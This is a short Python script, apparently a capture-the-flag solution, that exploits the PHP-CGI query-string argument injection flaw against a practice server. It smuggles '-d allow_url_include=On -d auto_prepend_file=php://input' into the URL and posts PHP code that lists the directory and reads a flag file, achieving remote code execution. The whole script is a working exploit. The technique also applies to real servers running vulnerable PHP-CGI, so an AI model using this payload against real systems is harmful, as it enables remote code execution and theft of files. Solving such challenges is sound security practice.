import requests


def main():
    url = 'http://ctfq.sweetduet.info:10080/~q12/index.php'
    query = '?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input'
    code = '''
        <?php

        $res_dir = opendir('.');
        while ($file_name = readdir($res_dir)) {
            print "$file_name\n";
        }
        readfile('flag_flag_flag.txt');
        closedir($res_dir);

        ?>
    '''
    res = requests.post(url+query, data=code)
    print(res.text)


if __name__ == '__main__':
    main()
